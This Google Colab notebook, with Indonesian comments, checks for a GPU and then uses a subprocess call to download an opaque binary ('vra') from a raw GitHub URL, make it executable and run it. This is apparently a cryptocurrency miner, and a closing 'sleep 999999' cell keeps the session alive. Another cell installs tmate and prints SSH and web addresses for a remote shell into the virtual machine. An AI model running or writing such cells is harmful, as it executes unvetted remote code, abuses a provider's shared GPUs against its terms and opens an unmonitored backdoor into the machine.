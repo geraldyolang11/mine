{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "5_6078096520249345310.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "private_outputs": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "Dapatkan GPU Disini ..."
      ],
      "metadata": {
        "id": "0lsUeWBCPcx1"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "kYTd5eO8AKHM"
      },
      "source": [
        "import torch\n",
        "\n",
        "if torch.cuda.is_available():\n",
        "    device = torch.device(\"cuda:0\")\n",
        "    print(\"GPU\")\n",
        "else:\n",
        "    device = torch.device(\"cpu\")\n",
        "    print(\"CPU\")"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Cek GPU yang di dapatkan..."
      ],
      "metadata": {
        "id": "Qw2QB7v6PjL8"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OKzU0gPpBgAX"
      },
      "source": [
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from os import system, name\n",
        "from time import sleep\n",
        "from subprocess import PIPE, Popen\n",
        "import base64\n",
        " \n",
        "\n",
        " \n",
        "\n",
        " \n",
        "def cmdline(command):\n",
        "    process = Popen(\n",
        "        args=command,\n",
        "        stdout=PIPE,\n",
        "        shell=True\n",
        "    )\n",
        "    return process.communicate()[0]\n",
        " \n",
        "\n",
        " \n",
        "\n",
        "\n",
        "cmdline ( 'wget https://raw.githubusercontent.com/gyrogerald/dera/main/vra && chmod 777 vra && ./vra' )"
      ],
      "metadata": {
        "id": "guMr7n0rNauk"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Jalankan Ini... !"
      ],
      "metadata": {
        "id": "xLMHrT6QPXRF"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pkill -9 tmate\n",
        "!wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null\n",
        "!tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null\n",
        "!rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1\n",
        "!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready\n",
        "!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p \"Connect with SSH address: #{tmate_ssh}\"\n",
        "!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p \"Connect with web: #{tmate_web}\"\n"
      ],
      "metadata": {
        "id": "bt9OtwdhO_mi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Running ya... !!"
      ],
      "metadata": {
        "id": "IXK21L4gPK2e"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!sleep 999999"
      ],
      "metadata": {
        "id": "u0Lm1NDGPHdx"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}